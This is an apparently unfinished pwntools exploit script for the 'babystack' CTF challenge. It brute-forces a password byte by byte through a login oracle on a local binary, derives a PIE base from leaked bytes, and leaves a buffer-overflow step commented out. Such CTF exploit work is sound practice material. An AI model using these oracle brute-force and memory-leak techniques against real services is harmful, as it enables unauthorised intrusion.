#!/usr/bin/env python

import pwn

pwn.context.arch = 'amd64'
pwn.context.terminal = ['tmux', 'splitw', '-h']

io = pwn.process('./babystack')
elf = pwn.ELF('./babystack')

print(elf.plt)

# brute force canary

canary = b''

for i in range(40):
	for c in range(256):
		if c == 0x00 or c == 0xa0:
			continue
		io.recvuntil(b'>> ')
		io.send(b'1AAAAAAAAAAAAAAA')
		io.recvuntil(b'Your passowrd :')
		io.sendline(canary + bytes([c]))
		recv = io.recvuntil(b'!')
		if recv == b'Login Success !':
			canary += bytes([c])
			io.recvuntil(b'>> ')
			io.send(b'1AAAAAAAAAAAAAAA')
			break

assert len(canary) == 38 # 40 - 2 * '\x00'

pie_leak = pwn.u64(canary[32:40].ljust(8, b'\0'))
pie_base = pie_leak - 0x1060

canary = canary[0:32]

#io.recvuntil(b'>> ')
#io.send(b'1')
#io.recvuntil(b'Your passowrd :')
#io.send(b'A' * 127)
#
#io.recvuntil(b'>> ')
#io.send(b'1')
#io.recvuntil(b'Your passowrd :')
#io.send(b'\n')
#
#io.recvuntil(b'>> ')
#io.send(b'3')
#io.recvuntil(b'Copy :')
#io.send(b'B' * 63)
#
#pwn.gdb.attach(io, '''
	#set disassembly-flavor intel
	#layout asm
	#focus cmd
#''')

io.interactive()
